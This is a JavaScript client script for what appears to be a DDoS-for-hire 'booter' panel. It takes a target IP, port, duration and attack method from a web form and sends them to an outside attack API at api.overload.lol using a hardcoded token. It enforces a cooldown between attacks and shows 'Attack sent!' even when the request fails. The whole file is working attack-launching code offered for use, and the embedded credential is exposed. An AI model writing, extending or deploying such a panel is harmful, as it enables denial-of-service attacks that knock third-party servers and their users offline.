let lastAttackTime = 0;  // To track the last attack time
const cooldownTime = 120 * 1000;  // Cooldown time in milliseconds (120 seconds)

function sendRequest() {
    const ip = document.getElementById("ip").value;
    const port = document.getElementById("port").value;
    const time = document.getElementById("time").value;
    const method = document.getElementById("method").value;
    const sendButton = document.getElementById("sendButton");  // The button to send the attack
    const currentTime = new Date().getTime();

    // Check if the cooldown period has passed
    if (currentTime - lastAttackTime < cooldownTime) {
        const remainingTime = Math.ceil((cooldownTime - (currentTime - lastAttackTime)) / 1000);  // In seconds
        document.getElementById("result").innerHTML = `
            <p class="text-yellow-400">You are in a cooldown of ${remainingTime} seconds</p>
        `;
        document.getElementById("result").classList.remove("hidden");

        // Disable the send button while in cooldown
        sendButton.disabled = true;

        // Re-enable the button after the cooldown period
        setTimeout(() => {
            sendButton.disabled = false;
            document.getElementById("result").innerHTML = '';  // Clear the cooldown message
            document.getElementById("result").classList.add("hidden");
        }, cooldownTime - (currentTime - lastAttackTime));

        return;  // Don't proceed with the attack
    }

    const url = `https://api.overload.lol/?token=Hfurhriebfufhrishfithf&host=${ip}&port=${port}&time=${time}&method=${method}`;

    fetch(url)
        .then(response => {
            if (!response.ok) throw new Error(`Server error: ${response.status}`);
            return response.json(); // Parse response as JSON
        })
        .then(data => {
            if (data.error && data.error.includes("All concurrents in use")) {
                // Extract seconds from the message or use 120 seconds if no seconds are returned
                const seconds = data.error.match(/\d+/)?.[0] || 120;
                document.getElementById("result").innerHTML = `
                    <p class="text-yellow-400">Wait ${seconds} seconds before you send an attack again!</p>
                `;
            } else {
                // Update the last attack time
                lastAttackTime = currentTime;

                document.getElementById("result").innerHTML = `
                    <p><strong>Host:</strong> ${ip}</p>
                    <p><strong>Port:</strong> ${port}</p>
                    <p><strong>Time:</strong> ${time}</p>
                    <p><strong>Method:</strong> ${method}</p>
                    <p class="text-green-400">Attack sent!</p>
                `;
            }
            document.getElementById("result").classList.remove("hidden");
        })
        .catch(error => {
            // In case of an error, still show the attack sent message
            document.getElementById("result").innerHTML = `
                <p><strong>Host:</strong> ${ip}</p>
                <p><strong>Port:</strong> ${port}</p>
                <p><strong>Time:</strong> ${time}</p>
                <p><strong>Method:</strong> ${method}</p>
                <p class="text-green-400">Attack sent!</p>
            `;
            document.getElementById("result").classList.remove("hidden");
        });
}
